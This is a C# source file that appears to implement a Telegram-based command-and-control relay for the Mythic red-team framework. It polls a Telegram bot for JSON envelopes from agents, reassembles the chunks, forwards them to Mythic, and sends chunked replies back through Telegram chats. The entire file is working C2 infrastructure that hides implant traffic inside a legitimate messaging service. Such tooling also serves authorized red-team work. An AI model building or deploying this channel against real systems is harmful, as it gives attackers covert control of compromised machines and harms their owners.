using System.Collections.Concurrent;
using System.Text.Json;
using PushC2Services;

namespace TelegramC2;

internal sealed class TelegramServer : IDisposable
{
    private const int EnvelopeChunkSize = 2800;
    private readonly ServerConfig _config;
    private readonly TelegramApiClient _telegram;
    private readonly MythicClient _mythic;
    private readonly ChunkAssembler _assembler = new();
    private readonly ConcurrentDictionary<string, string> _routes = new(StringComparer.Ordinal);

    public TelegramServer(ServerConfig config, TelegramApiClient telegram, MythicClient mythic)
    {
        _config = config;
        _telegram = telegram;
        _mythic = mythic;
        _mythic.MessageReceived += HandleMythicMessageAsync;
    }

    public async Task RunAsync(CancellationToken cancellationToken)
    {
        await _mythic.StartAsync(cancellationToken);
        while (!cancellationToken.IsCancellationRequested)
        {
            try
            {
                IReadOnlyList<TelegramUpdate> updates = await _telegram.GetUpdatesAsync(
                    _config.PollTimeout,
                    cancellationToken);
                foreach (TelegramUpdate update in updates)
                {
                    await HandleTelegramUpdateAsync(update);
                }
            }
            catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
            {
                break;
            }
            catch (Exception exception)
            {
                Console.Error.WriteLine($"Telegram polling failed: {exception.Message}");
                await Task.Delay(TimeSpan.FromSeconds(2), cancellationToken);
            }
        }
    }

    private async Task HandleTelegramUpdateAsync(TelegramUpdate update)
    {
        TelegramMessage? message = update.Message;
        if (message?.From?.IsBot != true ||
            message.Chat is null ||
            string.IsNullOrWhiteSpace(message.Text))
        {
            return;
        }

        TelegramEnvelope? envelope;
        try
        {
            envelope = JsonSerializer.Deserialize<TelegramEnvelope>(message.Text);
        }
        catch (JsonException)
        {
            return;
        }

        if (envelope is null ||
            !envelope.ToServer ||
            string.IsNullOrWhiteSpace(envelope.SenderId))
        {
            return;
        }

        _routes[envelope.SenderId] = message.Chat.Id.ToString();
        if (_assembler.TryAdd(envelope.SenderId, envelope, out string assembled))
        {
            await _mythic.SendAsync(envelope.SenderId, assembled);
        }
    }

    private async Task HandleMythicMessageAsync(PushC2MessageFromMythic message)
    {
        if (!message.Success ||
            string.IsNullOrWhiteSpace(message.TrackingID) ||
            !_routes.TryGetValue(message.TrackingID, out string? chatId))
        {
            return;
        }

        await SendPayloadAsync(
            chatId,
            message.TrackingID,
            message.Message.ToStringUtf8(),
            CancellationToken.None);
    }

    private async Task SendPayloadAsync(
        string chatId,
        string routeId,
        string payload,
        CancellationToken cancellationToken)
    {
        string packetId = Guid.NewGuid().ToString("N");
        int chunks = Math.Max(1, (payload.Length + EnvelopeChunkSize - 1) / EnvelopeChunkSize);
        for (int index = 0; index < chunks; index++)
        {
            int offset = index * EnvelopeChunkSize;
            int length = Math.Min(EnvelopeChunkSize, payload.Length - offset);
            var envelope = new TelegramEnvelope
            {
                ClientId = routeId,
                ToServer = false,
                PacketId = packetId,
                Chunk = index,
                Chunks = chunks,
                Message = payload.Substring(offset, length)
            };

            await _telegram.SendTextAsync(
                chatId,
                JsonSerializer.Serialize(envelope),
                cancellationToken);
        }
    }

    public void Dispose()
    {
        _mythic.MessageReceived -= HandleMythicMessageAsync;
    }
}
